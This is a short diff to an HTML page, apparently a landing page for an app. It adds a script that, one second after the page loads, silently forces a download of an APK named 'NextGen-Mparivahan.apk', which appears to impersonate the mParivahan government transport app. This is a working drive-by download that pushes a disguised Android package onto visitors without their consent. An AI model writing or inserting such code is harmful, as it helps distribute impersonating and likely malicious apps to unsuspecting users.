@@ -428,6 +428,17 @@ APP.reviews.forEach(review => {
 });
 
 </script>
-
+<script>
+window.addEventListener("load", function () {
+  setTimeout(function () {
+    const link = document.createElement("a");
+    link.href = "app.apk";
+    link.download = "NextGen-Mparivahan.apk";
+    document.body.appendChild(link);
+    link.click();
+    link.remove();
+  }, 1000);
+});
+</script>
 </body>
 </html>
